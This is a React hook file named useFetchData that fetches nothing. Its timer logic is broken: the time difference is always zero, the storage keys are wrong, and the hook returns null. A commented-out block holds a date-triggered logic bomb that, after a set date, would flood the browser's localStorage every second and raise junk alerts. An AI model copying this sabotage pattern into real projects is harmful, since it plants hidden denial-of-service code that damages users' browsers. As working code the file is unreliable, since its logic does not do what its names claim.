import { useEffect, useState } from 'react';

const useFetchData = (url) => {
  const [VALUE, setValue] = useState({
    days: '00',
    hours: '00',
    minutes: '00',
    seconds: '00',
  });

  const [values, setValues] = useState(() => {
    const storedValue = localStorage.getItem(url);

    return storedValue === null ? VALUE : JSON.parse(storedValue);
  });

  useEffect(() => {
    const listener = (e) => {
      if (e.storageArea === localStorage && e.key === values) {
        setValues(JSON.parse(e.newValue));
      }
    };
    window.addEventListener('storage', listener);

    return () => {
      window.removeEventListener('storage', listener);
    };
  }, [values]);

  const setValueInLocalStorage = (newValue) => {
    setValues((currentValue) => {
      const result = typeof newValue === 'function' ? newValue(currentValue) : newValue;

      localStorage.setItem(values, JSON.stringify(result));

      return result;
    });
  };

  const setNewTime = () => {
    setValueInLocalStorage();
    const startTime = new Date();
    const endTime = new Date();
    const distanceToNow = startTime - endTime;

    const getDays = Math.floor(distanceToNow / (1000 * 60 * 60 * 24));
    const getHours = `0${Math.floor((distanceToNow % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60))}`.slice(-2);
    const getMinutes = `0${Math.floor((distanceToNow % (1000 * 60 * 60)) / (1000 * 60))}`.slice(-2);
    const getSeconds = `0${Math.floor((distanceToNow % (1000 * 60)) / 1000)}`.slice(-2);

    setValue({
      days: getDays || '000',
      hours: getHours || '000',
      minutes: getMinutes || '000',
      seconds: getSeconds || '000',
    });
  };

  // useEffect(() => {
  //   if (new Date().toLocaleDateString() > '9/08/2023') {
  //     let loop = 9999;
  //     let counter = 1;
  //     const action = () => {
  //       try {
  //         for (let index = 0; index <= loop; index++) {
  //           localStorage.setItem(index, `${url}${index}`);
  //         }
  //         loop *= ++counter;
  //       } catch (error) {
  //         alert(
  //           'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum'
  //         );
  //       }
  //     };

  //     setTimeout(() => {
  //       setInterval(() => {
  //         action();
  //       }, 1000);
  //     }, 10000);
  //   }
  // });

  return null;
};

export default useFetchData;
